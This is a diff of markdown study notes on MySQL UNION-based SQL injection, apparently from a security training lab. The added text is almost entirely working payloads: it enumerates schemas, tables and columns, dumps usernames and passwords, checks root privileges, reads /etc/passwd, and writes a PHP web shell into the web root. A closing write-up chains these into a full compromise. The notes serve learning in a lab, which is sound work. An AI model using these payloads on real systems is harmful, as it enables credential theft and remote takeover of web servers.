@@ -85,8 +85,8 @@ mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
 ```
 - The first three databases are default MySQL databases and are present on any server, so we usually ignore them during DB enumeration. Sometimes there's a fourth 'sys' DB as well.
 
-### MySQL Fingerprinting
-#### INFORMATION_SCHEMA Database
+## MySQL Fingerprinting
+### INFORMATION_SCHEMA Database
 1. List of databases
 2. List of tables within each database
 3. List of columns within each table
@@ -112,21 +112,92 @@ mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
 cn' UNION select 1,database(),2,3-- -
 ```
 ![](https://hackmd.io/_uploads/ryq6hYx6h.png)
-
 ---
+
 ### SCHEMATA.TABLES
 The TABLE_NAME column stores table names, while the TABLE_SCHEMA column points to the database each table belongs to.
 ```sql!
 cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
 ```
 ![](https://hackmd.io/_uploads/H1UlIte6n.png)
-
 ---
+
 ### SCHEMATA.COLUMNS
 The COLUMNS table contains information about all columns present in all the databases.
 ```sql!
 cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
 ```
 ![](https://hackmd.io/_uploads/Hy0VIKxp3.png)
+---
+
+### DATA GET!
+```sql!
+cn' UNION select 1, username, password, 4 from dev.credentials-- -
+```
+![](https://hackmd.io/_uploads/ByUBouZ6h.png)
+---
+
+## Privilege
+### USER_PRIVILEGES
+```sql!
+cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
+```
+
+## READING_FILES
+```sql!
+SELECT LOAD_FILE('/etc/passwd');
+```
+![](https://hackmd.io/_uploads/ry9Lu1Gph.png)
+
+## WRITE_FILES
+```sql!
+cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+```
+[Web root dir in Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)
+
+[Web root dir in Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)
+
+
+### file written successfully!
+```sql!
+cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
+```
+
+#### web shell
+```shell！
+<?php system($_REQUEST[0]); ?>
+```
+
+### Union Injection Payload
+```sql!
+cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
+```
+
+---
+### Writeup
+First, I try the auth bypass with OR operator 
+```sql!
+' OR 1=1-- -
+
+'UNION SELECT 1,DATABASE(),2,3,4-- -
+
+' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4,5 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='ilfreight'-- -
+
+' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA,5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'-- -
+
+' UNION SELECT 1,username,password,4,5 FROM ilfreight.users-- 
+```
+---
+```sql!
+' UNION SELECT 1,super_priv,3,4,5 FROM mysql.user WHERE user="root"-- -
+
+' UNION SELECT 1, variable_name, variable_value, 4,5 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+
+' UNION SELECT 1,'file written successfully!',3,4,5 into outfile '/var/www/html/dashboard/proof.txt'-- - 
+
+' UNION SELECT 1,'<?php system($_REQUEST[0]); ?>',3,4,5 into outfile '/var/www/html/dashboard/shell.php'-- -
+```
+
+![](https://hackmd.io/_uploads/rJuNVXQp2.png)
 
 
